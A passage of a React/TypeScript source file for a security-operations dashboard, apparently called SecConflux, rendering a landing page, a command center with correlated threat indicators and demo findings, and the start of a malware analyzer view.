    {
      step: '4. Phishing Detector',
      tool: 'phishing' as ToolId,
      mainTab: 'analysis',
      subTab: 'dashboard',
      headline: 'Originating Hop #1 MTA in Spearphish',
      badge: 'UNSAFE 9.2/10',
      detail: 'Identified in `X-Originating-IP` and Received Hop #1 (`edge-gw45.evil-login-portal.com`) of the weaponized wire transfer email delivering `Invoice_Q3_Remittance.zip`.'
    },
    {
      step: '5. RuleForge',
      tool: 'ruleforge' as ToolId,
      mainTab: 'workshop',
      subTab: 'author',
      headline: 'Compiled Cross-SIEM Detection Rule',
      badge: '8 SIEM DIALECTS',
      detail: 'Auto-synthesized into production Sentinel KQL, Splunk SPL, and Sigma rules (`v-104`) verified against live sample logs with Three-Valued Evaluation (`matched`).'
    }
  ];

  return (
    <div className="space-y-8 max-w-7xl mx-auto pb-12">
      {/* 6.1 Hero Section */}
      <section className="rounded-2xl p-8 md:p-10 sc-surface sc-hero-grid sc-glow relative overflow-hidden">
        <div className="max-w-3xl space-y-4">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full text-xs font-semibold border" style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)' }}>
            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
            <span>5 Engines · 33+ Intel Sources · 8 SIEM Dialects · 812+ YARA Rules</span>
          </div>
          <h1 className="text-3xl sm:text-4xl md:text-5xl font-extrabold tracking-tight">
            <span className="sc-accent-text">Converge. Correlate. Contain.</span>
          </h1>
          <p className="text-base sm:text-lg leading-relaxed" style={{ color: 'var(--color-text-secondary)' }}>
            Five security engines. One analyst workspace. Zero tab switching. Built for high-velocity SOC investigations across binaries, threat intelligence, Windows EVTX logs, phishing forensics, and multi-SIEM detection engineering.
          </p>
          <div className="flex flex-wrap items-center gap-3 pt-2">
            <button
              type="button"
              onClick={() => onNavigate('dashboard')}
              className="px-5 py-2.5 rounded-lg text-sm font-semibold text-white sc-accent-bg shadow-lg hover:opacity-95 transition cursor-pointer"
            >
              Open Command Center →
            </button>
            <button
              type="button"
              onClick={onOpenTour}
              className="px-4 py-2.5 rounded-lg text-sm font-semibold border hover:opacity-90 transition cursor-pointer"
              style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
            >
              Take a Tour (?)
            </button>
          </div>
        </div>
      </section>

      {/* 6.5 Quick Actions Bar */}
      <section className="rounded-xl p-4 sc-surface space-y-3">
        <div className="flex flex-col lg:flex-row lg:items-center justify-between gap-3">
          <div className="flex items-center gap-2">
            <span className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
              Immediate Analyst Workflows
            </span>
          </div>
          <div className="flex flex-wrap items-center gap-2">
            <button
              type="button"
              onClick={() => onTriggerUploadModal('malware')}
              className="px-3 py-1.5 rounded-lg text-xs font-semibold border hover:opacity-90 flex items-center gap-1.5 cursor-pointer"
              style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)' }}
            >
              <ToolIcon tool="malware" size={14} />
              <span>New Malware Scan</span>
            </button>
            <button
              type="button"
              onClick={() => onTriggerUploadModal('events')}
              className="px-3 py-1.5 rounded-lg text-xs font-semibold border hover:opacity-90 flex items-center gap-1.5 cursor-pointer"
              style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)' }}
            >
              <ToolIcon tool="events" size={14} />
              <span>Ingest EVTX</span>
            </button>
            <button
              type="button"
              onClick={() => onTriggerUploadModal('phishing')}
              className="px-3 py-1.5 rounded-lg text-xs font-semibold border hover:opacity-90 flex items-center gap-1.5 cursor-pointer"
              style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)' }}
            >
              <ToolIcon tool="phishing" size={14} />
              <span>Analyze Email (.eml)</span>
            </button>
            <button
              type="button"
              onClick={() => onNavigate('ruleforge', 'workshop', 'author')}
              className="px-3 py-1.5 rounded-lg text-xs font-semibold border hover:opacity-90 flex items-center gap-1.5 cursor-pointer"
              style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)' }}
            >
              <ToolIcon tool="ruleforge" size={14} />
              <span>Create Detection Rule</span>
            </button>
          </div>
        </div>
        <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-2 pt-1">
          <div className="relative flex-1">
            <input
              type="text"
              value={quickIocInput}
              onChange={(e) => setQuickIocInput(e.target.value)}
              onKeyDown={(e) => {
                if (e.key === 'Enter' && quickIocInput.trim()) onQuickIocLookup(quickIocInput.trim());
              }}
              placeholder="Quick IOC Lookup (e.g., 198.51.100.45, evil-login-portal.com, bc1qxy2..., +1-415-890-9912, password:Summer2026!)"
              className="w-full px-3.5 py-2 rounded-lg text-xs sc-mono border focus:outline-none"
              style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
            />
          </div>
          <button
            type="button"
            onClick={() => {
              if (quickIocInput.trim()) onQuickIocLookup(quickIocInput.trim());
            }}
            className="px-4 py-2 rounded-lg text-xs font-semibold text-white sc-accent-bg cursor-pointer shrink-0"
          >
            🔍 Enrich Indicator →
          </button>
        </div>
      </section>

      {/* 6.2 Tool Cards Grid */}
      <section className="space-y-3">
        <div className="flex items-center justify-between">
          <h2 className="text-lg font-bold">Integrated Security Engines</h2>
          <span className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
            Press <Kbd>1</Kbd> – <Kbd>5</Kbd> to jump directly to any engine
          </span>
        </div>
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 2xl:grid-cols-5 gap-4">
          {(Object.values(TOOLS_REGISTRY) as ToolDefinition[]).map((tool) => (
            <div
              key={tool.id}
              className="rounded-xl p-5 sc-surface sc-page-enter flex flex-col justify-between transition-transform duration-200 hover:scale-[1.02] sc-glow"
            >
              <div className="space-y-3">
                <div className="flex items-center justify-between">
                  <div
                    className="w-10 h-10 rounded-lg flex items-center justify-center text-white shadow"
                    style={{ background: `linear-gradient(135deg, ${tool.accentFrom}, ${tool.accentTo})` }}
                  >
                    <ToolIcon tool={tool.id} size={20} />
                  </div>
                  <Kbd>{tool.hotkey}</Kbd>
                </div>
                <div>
                  <h3 className="text-base font-bold">{tool.name}</h3>
                  <p className="text-xs mt-1 leading-relaxed" style={{ color: 'var(--color-text-secondary)' }}>
                    {tool.description}
                  </p>
                </div>
                <ul className="space-y-1.5 pt-1 text-[11px]" style={{ color: 'var(--color-text-secondary)' }}>
                  {tool.capabilities.map((cap, idx) => (
                    <li key={idx} className="flex items-start gap-1.5">
                      <span style={{ color: tool.accentFrom }}>▸</span>
                      <span>{cap}</span>
                    </li>
                  ))}
                </ul>
              </div>

              <div className="pt-4 mt-4 border-t flex items-center justify-between" style={{ borderColor: 'var(--color-border-subtle)' }}>
                <button
                  type="button"
                  onClick={() => onNavigate(tool.id, 'overview')}
                  className="text-xs font-medium hover:underline cursor-pointer"
                  style={{ color: 'var(--color-text-secondary)' }}
                >
                  Overview
                </button>
                <button
                  type="button"
                  onClick={() => onNavigate(tool.id, tool.mainTabs[1].id, tool.subTabs[0].id)}
                  className="px-3 py-1.5 rounded-lg text-xs font-semibold text-white cursor-pointer"
                  style={{ background: `linear-gradient(135deg, ${tool.accentFrom}, ${tool.accentTo})` }}
                >
                  Launch {tool.mainTabs[1].label} →
                </button>
              </div>
            </div>
          ))}
        </div>
      </section>

      {/* 6.3 Cross-Tool Evidence Demo */}
      <section className="rounded-xl p-6 sc-surface space-y-4">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
          <div>
            <h2 className="text-base font-bold">Cross-Tool Evidence Convergence Demo</h2>
            <p className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
              Click any stage below to trace how a single adversary C2 IP (<code className="sc-mono font-semibold" style={{ color: 'var(--color-malicious)' }}>198.51.100.45</code>) correlates across all 5 SecConflux engines.
            </p>
          </div>
          <VerdictBadge verdict="malicious" label="ACTIVE INTRUSION CHAIN: 198.51.100.45" />
        </div>

        <div className="grid grid-cols-1 md:grid-cols-5 gap-3">
          {evidenceSteps.map((st, idx) => {
            const active = selectedDemoStep === idx;
            return (
              <button
                key={idx}
                type="button"
                onClick={() => setSelectedDemoStep(idx)}
                className="text-left p-3.5 rounded-xl border transition cursor-pointer"
                style={{
                  backgroundColor: active ? 'var(--color-surface-raised)' : 'var(--color-canvas)',
                  borderColor: active ? 'var(--color-border-focus)' : 'var(--color-border)'
                }}
              >
                <div className="flex items-center justify-between text-[11px] font-semibold mb-1.5" style={{ color: 'var(--color-text-secondary)' }}>
                  <span className="flex items-center gap-1.5">
                    <ToolIcon tool={st.tool} size={13} />
                    <span>{st.step}</span>
                  </span>
                </div>
                <div className="text-xs font-bold mb-1.5">{st.headline}</div>
                <span className="sc-mono text-[10px] px-2 py-0.5 rounded bg-red-500/15 text-red-400 font-semibold">
                  {st.badge}
                </span>
              </button>
            );
          })}
        </div>

        <div
          className="p-4 rounded-xl border flex flex-col sm:flex-row sm:items-center justify-between gap-4"
          style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)' }}
        >
          <div className="space-y-1">
            <div className="text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--accent-from)' }}>
              {evidenceSteps[selectedDemoStep].step} — {evidenceSteps[selectedDemoStep].headline}
            </div>
            <p className="text-xs leading-relaxed" style={{ color: 'var(--color-text-primary)' }}>
              {evidenceSteps[selectedDemoStep].detail}
            </p>
          </div>
          <button
            type="button"
            onClick={() =>
              onNavigate(
                evidenceSteps[selectedDemoStep].tool,
                evidenceSteps[selectedDemoStep].mainTab,
                evidenceSteps[selectedDemoStep].subTab
              )
            }
            className="px-4 py-2 rounded-lg text-xs font-semibold text-white sc-accent-bg shrink-0 cursor-pointer"
          >
            Inspect in {TOOLS_REGISTRY[evidenceSteps[selectedDemoStep].tool].shortName} →
          </button>
        </div>
      </section>

      {/* 6.4 Recent Activity Feed */}
      <section className="rounded-xl p-6 sc-surface space-y-4">
        <div className="flex items-center justify-between">
          <div>
            <h2 className="text-base font-bold">Recent SOC Activity Stream</h2>
            <p className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
              Consolidated telemetry across all 5 engines
            </p>
          </div>
          <button
            type="button"
            onClick={() => onNavigate('dashboard')}
            className="text-xs font-semibold hover:underline cursor-pointer"
            style={{ color: 'var(--accent-from)' }}
          >
            View All Activity in Command Center →
          </button>
        </div>
        <div className="divide-y" style={{ borderColor: 'var(--color-border-subtle)' }}>
          {activityFeed.slice(0, 5).map((item) => {
            const toolDef = TOOLS_REGISTRY[item.tool];
            return (
              <div key={item.id} className="py-3 flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                <div className="flex items-start sm:items-center gap-3">
                  <div
                    className="w-7 h-7 rounded-lg flex items-center justify-center text-white shrink-0"
                    style={{ background: `linear-gradient(135deg, ${toolDef.accentFrom}, ${toolDef.accentTo})` }}
                  >
                    <ToolIcon tool={item.tool} size={14} />
                  </div>
                  <div>
                    <div className="text-xs font-semibold flex flex-wrap items-center gap-2">
                      <span>{toolDef.name}</span>
                      <span style={{ color: 'var(--color-text-tertiary)' }}>·</span>
                      <span style={{ color: 'var(--color-text-primary)' }}>{item.description}</span>
                    </div>
                    <div className="sc-mono text-[11px] mt-0.5" style={{ color: 'var(--color-text-tertiary)' }}>
                      {item.timestamp} · {item.actionType}
                    </div>
                  </div>
                </div>
                <div className="flex items-center gap-2 shrink-0">
                  {item.verdict && <VerdictBadge verdict={item.verdict} label={item.scoreText} />}
                  <button
                    type="button"
                    onClick={() => onNavigate(item.tool, toolDef.mainTabs[1].id, item.targetSubTab || toolDef.subTabs[0].id)}
                    className="px-2.5 py-1 rounded text-xs font-medium border hover:opacity-80 cursor-pointer"
                    style={{ borderColor: 'var(--color-border)', color: 'var(--color-text-secondary)' }}
                  >
                    Open →
                  </button>
                </div>
              </div>
            );
          })}
        </div>
      </section>
    </div>
  );
};

// ============================================================================
// 8. UNIFIED COMMAND CENTER DASHBOARD (Section 7 — #/dashboard)
// ============================================================================
export const CommandCenterDashboard: React.FC<{
  activityFeed: ActivityItem[];
  backendStatus: Record<ToolId, 'online' | 'offline' | 'unknown'>;
  onNavigate: (page: PageRouteId, mainTab?: string, subTab?: string) => void;
  onPivot: (req: Omit<PivotRequest, 'id' | 'timestamp'>) => void;
  onBatchEnrichAll: (iocs: string[]) => void;
  onAddToast: (t: Omit<ToastMessage, 'id'>) => void;
}> = ({ activityFeed, backendStatus, onNavigate, onPivot, onBatchEnrichAll, onAddToast }) => {
  const [selectedToolsFilter, setSelectedToolsFilter] = useState<Record<ToolId, boolean>>({
    malware: true,
    ioc: true,
    events: true,
    phishing: true,
    ruleforge: true
  });
  const [severityFilter, setSeverityFilter] = useState<string>('all');
  const [timeRange, setTimeRange] = useState<string>('24h');

  const postureTiles = [
    {
      tool: 'malware' as ToolId,
      metric: '12 Scans',
      critBadge: '3 CRITICAL',
      verdict: 'malicious' as VerdictType,
      sparkline: [2, 3, 1, 5, 4, 8, 12],
      targetMain: 'investigation',
      targetSub: 'dashboard'
    },
    {
      tool: 'ioc' as ToolId,
      metric: '47 IOCs',
      critBadge: '5 MALICIOUS',
      verdict: 'malicious' as VerdictType,
      sparkline: [10, 14, 19, 22, 31, 39, 47],
      targetMain: 'lookup',
      targetSub: 'lookup'
    },
    {
      tool: 'events' as ToolId,
      metric: '3 Invest.',
      critBadge: '891 SIGMA',
      verdict: 'suspicious' as VerdictType,
      sparkline: [120, 240, 310, 490, 620, 740, 891],
      targetMain: 'investigation',
      targetSub: 'sigma'
    },
    {
      tool: 'phishing' as ToolId,
      metric: '8 Emails',
      critBadge: '2 UNSAFE',
      verdict: 'malicious' as VerdictType,
      sparkline: [1, 0, 2, 1, 3, 5, 8],
      targetMain: 'analysis',
      targetSub: 'dashboard'
    },
    {
      tool: 'ruleforge' as ToolId,
      metric: '24 Rules',
      critBadge: '2 REFUSALS',
      verdict: 'info' as VerdictType,
      sparkline: [4, 7, 11, 14, 18, 21, 24],
      targetMain: 'workshop',
      targetSub: 'author'
    }
  ];

  const criticalFindings = [
    {
      id: 'cf-1',
      severity: 'CRITICAL',
      verdict: 'malicious' as VerdictType,
      tool: 'malware' as ToolId,
      title: 'invoice_q3.exe — Cobalt Strike / AsyncRAT Loader (Score 87/100)',
      summary: 'Packed PE32+ executable with VirtualAllocEx/CreateRemoteThread injection into rundll32.exe and HTTPS beacon to 198.51.100.45:443.',
      timestamp: '11:42 UTC',
      mainTab: 'investigation',
      subTab: 'dashboard'
    },
    {
      id: 'cf-2',
      severity: 'CRITICAL',
      verdict: 'malicious' as VerdictType,
      tool: 'phishing' as ToolId,
      title: 'URGENT: Q3 Wire Transfer (#INV-99412) — Score 9.2/10 (UNSAFE)',
      summary: 'DMARC/DKIM failure, Reply-To divergence, Hop #1 originating from 198.51.100.45, and attached Invoice_Q3_Remittance.zip dropper.',
      timestamp: '11:38 UTC',
      mainTab: 'analysis',
      subTab: 'dashboard'
    },
    {
      id: 'cf-3',
      severity: 'CRITICAL',
      verdict: 'malicious' as VerdictType,
      tool: 'events' as ToolId,
      title: 'Sigma SIG-001 & SIG-003 Triggered on WKS-FINANCE04 (51 Matches)',
      summary: 'Sysmon Event ID 3 outbound connection from rundll32.exe to 198.51.100.45:443 + PowerShell Event ID 4104 encoded WebClient download.',
      timestamp: '11:50 UTC',
      mainTab: 'investigation',
      subTab: 'sigma'
    },
    {
      id: 'cf-4',
      severity: 'HIGH',
      verdict: 'malicious' as VerdictType,
      tool: 'ioc' as ToolId,
      title: '198.51.100.45 — Consensus Malicious Across 19/28 Intel Providers (92/100)',
      summary: 'Confirmed active Cobalt Strike C2 & LummaC2 exfiltration endpoint in AS209401 with self-signed TLS cert.',
      timestamp: '11:44 UTC',
      mainTab: 'lookup',
      subTab: 'lookup'
    },
    {
      id: 'cf-5',
      severity: 'MEDIUM',
      verdict: 'suspicious' as VerdictType,
      tool: 'ruleforge' as ToolId,
      title: 'Dialect Conversion Refusal: Multi-Event Sequence Join on Wazuh XML',
      summary: 'RuleForge safely refused approximate translation of temporal sequence stage to stateless Wazuh XML.',
      timestamp: '11:52 UTC',
      mainTab: 'workshop',
      subTab: 'author'
    }
  ];

  const correlatedIocs = [
    {
      ioc: '198.51.100.45',
      type: 'IPv4 C2',
      tools: ['malware', 'ioc', 'events', 'phishing', 'ruleforge'] as ToolId[],
      context: 'Malware C2 callback · IOC score 92/100 · 47 Sysmon EventID 3 hits · Phishing Hop #1 MTA · RuleForge KQL/Sigma filter'
    },
    {
      ioc: 'evil-login-portal.com',
      type: 'Domain',
      tools: ['malware', 'ioc', 'events', 'phishing'] as ToolId[],
      context: 'PE stage-2 string · Newly registered (15d) · PowerShell 4104 cradle · Phishing sender & credential harvester host'
    },
    {
      ioc: 'a4f8d91c8b2e47f9012c65b88e73a91c0d4b76e2f8a1234567890abcdef1e31b',
      type: 'SHA-256',
      tools: ['malware', 'ioc', 'events', 'phishing'] as ToolId[],
      context: 'invoice_q3.exe primary hash · 52/71 VT detections · Sysmon EventID 1 ProcessCreate · Phishing ZIP attachment payload'
    },
    {
      ioc: 'C:\\ProgramData\\Microsoft\\Vault\\sync_helper.dll',
      type: 'File Path',
      tools: ['malware', 'events', 'ruleforge'] as ToolId[],
      context: 'Sandbox dropped beacon DLL · Sysmon EventID 13 Run key target · RuleForge CommandLine filter predicate'
    }
  ];

  const filteredTimeline = useMemo(() => {
    return activityFeed.filter((item) => {
      if (!selectedToolsFilter[item.tool]) return false;
      if (severityFilter !== 'all' && item.severity !== severityFilter) return false;
      return true;
    });
  }, [activityFeed, selectedToolsFilter, severityFilter]);

  const onlineCount = Object.values(backendStatus).filter((s) => s === 'online').length;

  const handleExportActivityCsv = () => {
    const header = 'ID,Timestamp,Tool,ActionType,Severity,Score,Description\n';
    const rows = filteredTimeline
      .map((r) => `"${r.id}","${r.timestamp}","${r.tool}","${r.actionType}","${r.severity}","${r.scoreText || ''}","${r.description.replace(/"/g, '""')}"`)
      .join('\n');
    downloadFileBlob('secconflux-activity-log.csv', header + rows, 'text/csv');
    onAddToast({
      type: 'success',
      title: 'Activity Log Exported',
      description: `Downloaded ${filteredTimeline.length} activity records as CSV.`
    });
  };

  return (
    <div className="space-y-6 max-w-7xl mx-auto pb-12">
      {/* Top Banner */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
        <div>
          <h1 className="text-xl font-bold tracking-tight">Unified Command Center Dashboard</h1>
          <p className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
            Real-time cross-engine threat posture, prioritized alert triage, and multi-tool indicator correlation
          </p>
        </div>
        <div
          className="inline-flex items-center gap-2.5 px-3.5 py-1.5 rounded-full text-xs font-semibold border"
          style={{ backgroundColor: 'var(--color-surface)', borderColor: 'var(--color-border)' }}
        >
          <span className={`w-2.5 h-2.5 rounded-full ${onlineCount === 5 ? 'bg-emerald-400' : 'bg-amber-400'}`} />
          <span>Platform Health: {onlineCount}/5 Engines Online</span>
          <span style={{ color: 'var(--color-text-tertiary)' }}>({apiClient.useFixtures ? 'Fixture Mode' : 'Live Proxy'})</span>
        </div>
      </div>

      {/* 7.1 Threat Posture Summary Bar */}
      <section className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-3.5">
        {postureTiles.map((tile) => {
          const toolDef = TOOLS_REGISTRY[tile.tool];
          return (
            <button
              key={tile.tool}
              type="button"
              onClick={() => onNavigate(tile.tool, tile.targetMain, tile.targetSub)}
              className={`text-left p-4 rounded-xl sc-surface hover:scale-[1.02] transition cursor-pointer flex flex-col justify-between gap-3 sc-stagger-${(postureTiles.indexOf(tile) % 5) + 1}`}
            >
              <div className="flex items-center justify-between">
                <span className="inline-flex items-center gap-2 text-xs font-bold">
                  <span
                    className="w-6 h-6 rounded-md flex items-center justify-center text-white"
                    style={{ background: `linear-gradient(135deg, ${toolDef.accentFrom}, ${toolDef.accentTo})` }}
                  >
                    <ToolIcon tool={tile.tool} size={13} />
                  </span>
                  <span>{toolDef.shortName}</span>
                </span>
                <VerdictBadge verdict={tile.verdict} label={tile.critBadge} />
              </div>

              <div className="flex items-end justify-between gap-2 pt-1">
                <div>
                  <div className="sc-mono text-xl font-extrabold">{tile.metric}</div>
                  <div className="text-[10px]" style={{ color: 'var(--color-text-tertiary)' }}>
                    Last 7 days trend
                  </div>
                </div>
                <Sparkline values={tile.sparkline} color={toolDef.accentFrom} />
              </div>
            </button>
          );
        })}
      </section>

      {/* 7.2 Critical Findings Feed & 7.3 Cross-Tool IOC Correlation Panel */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-5">
        {/* 7.2 Critical Findings Feed */}
        <section className="lg:col-span-7 rounded-xl p-5 sc-surface space-y-3.5">
          <div className="flex items-center justify-between">
            <div>
              <h2 className="text-sm font-bold uppercase tracking-wider">Prioritized Critical Findings</h2>
              <p className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
                High-severity detections aggregated across Malware, IOC, Events, Phishing & RuleForge
              </p>
            </div>
            <span className="sc-mono text-xs px-2 py-0.5 rounded bg-red-500/15 text-red-400 font-semibold">
              {criticalFindings.length} Active Alerts
            </span>
          </div>

          <div className="space-y-2.5">
            {criticalFindings.map((f) => {
              const tDef = TOOLS_REGISTRY[f.tool];
              return (
                <div
                  key={f.id}
                  className="p-3.5 rounded-lg border flex flex-col sm:flex-row sm:items-center justify-between gap-3"
                  style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
                >
                  <div className="space-y-1">
                    <div className="flex flex-wrap items-center gap-2">
                      <VerdictBadge verdict={f.verdict} label={f.severity} />
                      <span className="inline-flex items-center gap-1 text-xs font-semibold" style={{ color: tDef.accentFrom }}>
                        <ToolIcon tool={f.tool} size={13} />
                        <span>{tDef.shortName}</span>
                      </span>
                      <span className="sc-mono text-[11px]" style={{ color: 'var(--color-text-tertiary)' }}>
                        {f.timestamp}
                      </span>
                    </div>
                    <div className="text-xs font-bold">{f.title}</div>
                    <p className="text-xs leading-relaxed" style={{ color: 'var(--color-text-secondary)' }}>
                      {f.summary}
                    </p>
                  </div>
                  <button
                    type="button"
                    onClick={() => onNavigate(f.tool, f.mainTab, f.subTab)}
                    className="px-3 py-1.5 rounded-lg text-xs font-semibold text-white sc-accent-bg shrink-0 cursor-pointer"
                  >
                    Investigate →
                  </button>
                </div>
              );
            })}
          </div>
        </section>

        {/* 7.3 Cross-Tool IOC Correlation Panel */}
        <section className="lg:col-span-5 rounded-xl p-5 sc-surface space-y-4 flex flex-col justify-between">
          <div className="space-y-3">
            <div className="flex items-center justify-between gap-2">
              <div>
                <h2 className="text-sm font-bold uppercase tracking-wider">Cross-Tool IOC Correlation Matrix</h2>
                <p className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
                  Indicators observed simultaneously in ≥ 3 security engines
                </p>
              </div>
              <button
                type="button"
                onClick={() => onBatchEnrichAll(correlatedIocs.map((c) => c.ioc))}
                className="px-3 py-1.5 rounded-lg text-xs font-semibold text-white sc-accent-bg cursor-pointer shrink-0"
              >
                Enrich All ({correlatedIocs.length}) →
              </button>
            </div>

            <div className="space-y-2.5">
              {correlatedIocs.map((item, idx) => (
                <div
                  key={idx}
                  className="p-3 rounded-lg border space-y-2"
                  style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
                >
                  <div className="flex items-center justify-between gap-2">
                    <span className="sc-mono text-xs font-bold truncate" title={item.ioc}>
                      {item.ioc}
                    </span>
                    <span className="sc-mono text-[10px] px-2 py-0.5 rounded border shrink-0" style={{ borderColor: 'var(--color-border)', color: 'var(--color-text-secondary)' }}>
                      {item.type}
                    </span>
                  </div>
                  <p className="text-[11px] leading-relaxed" style={{ color: 'var(--color-text-secondary)' }}>
                    {item.context}
                  </p>
                  <div className="flex items-center justify-between pt-1">
                    <div className="flex flex-wrap items-center gap-1">
                      {(['malware', 'ioc', 'events', 'phishing', 'ruleforge'] as ToolId[]).map((tid) => {
                        const present = item.tools.includes(tid);
                        const td = TOOLS_REGISTRY[tid];
                        return (
                          <span
                            key={tid}
                            className="px-2 py-0.5 rounded text-[10px] font-semibold flex items-center gap-1"
                            style={{
                              backgroundColor: present ? 'rgba(99, 102, 241, 0.16)' : 'var(--color-canvas)',
                              color: present ? td.accentFrom : 'var(--color-text-tertiary)',
                              border: `1px solid ${present ? td.accentFrom : 'var(--color-border-subtle)'}`
                            }}
                          >
                            <ToolIcon tool={tid} size={10} />
                            <span>{td.shortName}</span>
                          </span>
                        );
                      })}
                    </div>
                    <button
                      type="button"
                      onClick={() =>
                        onPivot({
                          fromTool: 'dashboard',
                          fromLabel: 'Command Center Correlation Matrix',
                          toTool: 'ioc',
                          toMainTab: 'lookup',
                          toSubTab: 'lookup',
                          indicatorValue: item.ioc,
                          indicatorType: item.type
                        })
                      }
                      className="text-[11px] font-semibold hover:underline cursor-pointer shrink-0 ml-2"
                      style={{ color: 'var(--accent-from)' }}
                    >
                      Pivot →
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>

          <div
            className="p-3 rounded-lg border text-xs flex items-center justify-between"
            style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border-subtle)' }}
          >
            <span style={{ color: 'var(--color-text-secondary)' }}>
              Campaign Cluster: <strong>FIN-Q4-COBALT-99412</strong>
            </span>
            <span className="sc-mono font-semibold text-emerald-400">Confidence: 98.4%</span>
          </div>
        </section>
      </div>

      {/* 7.4 Recent Activity Timeline */}
      <section className="rounded-xl p-5 sc-surface space-y-4">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-3">
          <div>
            <h2 className="text-sm font-bold uppercase tracking-wider">Unified Activity Timeline</h2>
            <p className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>
              Chronological audit trail across all 5 engines ({filteredTimeline.length} events shown)
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-2">
            {/* Tool filter checkboxes */}
            {(['malware', 'ioc', 'events', 'phishing', 'ruleforge'] as ToolId[]).map((tid) => (
              <label
                key={tid}
                className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-md text-xs border cursor-pointer select-none"
                style={{
                  backgroundColor: selectedToolsFilter[tid] ? 'var(--color-surface-raised)' : 'var(--color-canvas)',
                  borderColor: selectedToolsFilter[tid] ? 'var(--color-border-focus)' : 'var(--color-border)'
                }}
              >
                <input
                  type="checkbox"
                  checked={selectedToolsFilter[tid]}
                  onChange={(e) => setSelectedToolsFilter({ ...selectedToolsFilter, [tid]: e.target.checked })}
                  className="accent-indigo-500"
                />
                <span>{TOOLS_REGISTRY[tid].shortName}</span>
              </label>
            ))}

            <select
              value={severityFilter}
              onChange={(e) => setSeverityFilter(e.target.value)}
              className="px-2.5 py-1 rounded-md text-xs border"
              style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
              aria-label="Filter by severity"
            >
              <option value="all">All Severities</option>
              <option value="critical">Critical Only</option>
              <option value="high">High Only</option>
              <option value="medium">Medium Only</option>
            </select>

            <select
              value={timeRange}
              onChange={(e) => setTimeRange(e.target.value)}
              className="px-2.5 py-1 rounded-md text-xs border"
              style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
              aria-label="Filter by time range"
            >
              <option value="24h">Last 24 Hours</option>
              <option value="7d">Last 7 Days</option>
              <option value="30d">Last 30 Days</option>
            </select>

            <button
              type="button"
              onClick={handleExportActivityCsv}
              className="px-3 py-1 rounded-md text-xs font-semibold border hover:opacity-90 cursor-pointer"
              style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)' }}
            >
              ⬇ Export Activity Log (CSV)
            </button>
          </div>
        </div>

        <div className="divide-y" style={{ borderColor: 'var(--color-border-subtle)' }}>
          {filteredTimeline.map((act) => {
            const tDef = TOOLS_REGISTRY[act.tool];
            return (
              <div key={act.id} className="py-3 flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                <div className="flex items-center gap-3">
                  <div
                    className="w-7 h-7 rounded-lg flex items-center justify-center text-white shrink-0"
                    style={{ background: `linear-gradient(135deg, ${tDef.accentFrom}, ${tDef.accentTo})` }}
                  >
                    <ToolIcon tool={act.tool} size={14} />
                  </div>
                  <div>
                    <div className="text-xs font-semibold flex flex-wrap items-center gap-2">
                      <span className="px-2 py-0.5 rounded text-[10px] sc-mono border" style={{ borderColor: 'var(--color-border)' }}>
                        {act.actionType}
                      </span>
                      <span>{act.description}</span>
                    </div>
                    <div className="sc-mono text-[11px] mt-0.5" style={{ color: 'var(--color-text-tertiary)' }}>
                      {act.timestamp} · Source: {tDef.name}
                    </div>
                  </div>
                </div>
                <div className="flex items-center gap-2">
                  {act.verdict && <VerdictBadge verdict={act.verdict} label={act.scoreText} />}
                  <button
                    type="button"
                    onClick={() => onNavigate(act.tool, tDef.mainTabs[1].id, act.targetSubTab || tDef.subTabs[0].id)}
                    className="px-2.5 py-1 rounded text-xs font-medium border hover:opacity-80 cursor-pointer"
                    style={{ borderColor: 'var(--color-border)', color: 'var(--color-text-secondary)' }}
                  >
                    Inspect →
                  </button>
                </div>
              </div>
            );
          })}
        </div>
      </section>
    </div>
  );
};
// ============================================================================
// 9. TOOL 1: MALWARE ANALYZER (Section 8 — #/t/malware & #/t/malware/investigation)
// ============================================================================
const MALWARE_STAGES = [
  'ZIP Extract',
  'Offline Analysis',
  'VirusTotal',
  'FileScan',
  'Hybrid Analysis',
  'Triage'
];

export const MalwareTool: React.FC<{
  mainTab: string;
  subTab: string;
  setMainTab: (t: string) => void;
  setSubTab: (s: string) => void;
  reports: typeof FIXTURES.malwareReports;
